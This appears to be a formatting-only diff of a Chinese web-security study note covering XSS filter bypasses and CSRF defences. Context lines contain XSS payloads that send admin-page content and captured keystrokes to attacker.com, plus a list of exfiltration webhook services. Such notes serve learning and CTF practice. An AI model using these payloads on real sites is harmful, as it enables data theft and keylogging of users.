@@ -522,7 +522,7 @@ fetch(`/getflag\)
   <details markdown="1">
   <summary><span class="spoiler">Example</span></summary>
 
-  ##### WAF 繞過
+  #### WAF 繞過
 
   ```js
   // WAF 擋 alert() → 改用 print() 或 confirm() 確認 XSS 觸發
@@ -540,7 +540,7 @@ fetch(`/getflag\)
   $ t.split(`sessionId`)[1].split(`\x22`)[1]
   ```
 
-  ##### CSP 繞過
+  #### CSP 繞過
 
   ```js
   // CSP default-src 'self' 擋 img-src / connect-src 到外部
@@ -555,7 +555,7 @@ fetch(`/getflag\)
   $ <img src=x onerror="fetch(`/admin/settings`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,500))})">
   ```
 
-  ##### HttpOnly Cookie 繞過
+  #### HttpOnly Cookie 繞過
 
   ```js
   // HttpOnly 擋 document.cookie 讀取 session cookie
@@ -572,7 +572,7 @@ fetch(`/getflag\)
   $ <img src=x onerror="top.document.onkeypress=function(e){new Image().src=`https://attacker.com/?k=`+e.key}">
   ```
 
-  ##### Debug 技巧
+  #### Debug 技巧
 
   ```js
   // 加 .catch() 避免 payload 靜默失敗，錯誤也送到外部
@@ -581,7 +581,7 @@ fetch(`/getflag\)
   // 開發順序: 先送回應長度確認 fetch → 再送內容片段確認 parse → 最後組完整 payload
   ```
 
-  ##### 常用外帶 webhook
+  #### 常用外帶 webhook
   - [Beeceptor](https://beeceptor.com/) — 免費、即時查看 request
   - [Webhook.site](https://webhook.site/) — 免費、支援自訂回應
   - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) — 整合 Burp，支援 DNS/HTTP/SMTP
@@ -925,25 +925,24 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 
 也就是他和 XSS 的其中一個目的有點像，那就是偷到使用者的 cookie/session，只是方式不同，一個是利用 javascript 的 injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種 request，如果該網站沒有對 user 進行額外的身份驗證，那們光靠 user cookie/session 就有機會達成轉帳、發文之類的操作
 
-### 如何預防 CSRF
+- 如何預防 CSRF
+  - CSRF Token: 這是最簡單的方式，既然 attacker 可以透過惡意網站得到 victim 的 cookie，那我就額外在 server side 多一個驗證 token 的步驟，而該 token 無論如何都不會被 attacker 利用惡意網站得知，就可以確保目前的 request 是不是本人，而為什麼 CSRF token 無法被 attacker 得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
 
-- CSRF Token: 這是最簡單的方式，既然 attacker 可以透過惡意網站得到 victim 的 cookie，那我就額外在 server side 多一個驗證 token 的步驟，而該 token 無論如何都不會被 attacker 利用惡意網站得知，就可以確保目前的 request 是不是本人，而為什麼 CSRF token 無法被 attacker 得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
+    > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。
 
-  > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。
+    所以，attacker 的惡意網站並不會得知 user 在 a.com 這個網域的 token，應該說原本就是這樣設計的，所以除非 attacker**現場**看到受害者的 browser content，才能得知 CSRF Token
 
-  所以，attacker 的惡意網站並不會得知 user 在 a.com 這個網域的 token，應該說原本就是這樣設計的，所以除非 attacker**現場**看到受害者的 browser content，才能得知 CSRF Token
+  - SameSite Cookie
 
-- SameSite Cookie
+    就是設定 cookie
 
-  就是設定 cookie
+    > Set-Cookie: sessionid=abc123; SameSite=Strict
 
-  > Set-Cookie: sessionid=abc123; SameSite=Strict
+    SameSite 的效果是跨網站 request 不會帶 cookie，那麼同樣的就算 victim 點開 malicious website，也一樣不會被對方讀取到 cookie
 
-  SameSite 的效果是跨網站 request 不會帶 cookie，那麼同樣的就算 victim 點開 malicious website，也一樣不會被對方讀取到 cookie
+  - 敏感操作使用 POST
 
-- 敏感操作使用 POST
-
-  前面的 payload 範例有提到很多都是透過 GET qeury 進行惡意操作，那麼我們只要把敏感操作都利用 POST 的方式處理，就可以大大降低 CSRF 發生的情況
+    前面的 payload 範例有提到很多都是透過 GET qeury 進行惡意操作，那麼我們只要把敏感操作都利用 POST 的方式處理，就可以大大降低 CSRF 發生的情況
 
 </details>
 
